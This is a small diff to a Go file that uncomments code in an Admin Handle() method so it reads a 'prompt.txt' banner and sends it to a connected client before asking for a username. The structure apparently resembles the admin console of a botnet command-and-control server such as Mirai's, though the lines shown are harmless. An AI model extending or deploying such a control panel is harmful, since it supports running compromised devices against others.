@@ -5,7 +5,7 @@ import (
     "net"
     "time"
     "strings"
-    //"io/ioutil"
+    "io/ioutil"
     "strconv"
 )
 
@@ -24,7 +24,7 @@ func (this *Admin) Handle() {
     defer func() {
         this.conn.Write([]byte("\033[?1049l"))
     }()
-/*
+
     headerb, err := ioutil.ReadFile("prompt.txt")
     if err != nil {
         return
@@ -32,7 +32,7 @@ func (this *Admin) Handle() {
 
     header := string(headerb)
     this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
-*/
+
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
     this.conn.Write([]byte("\033[34;1user\033[33;3m: \033[0m"))
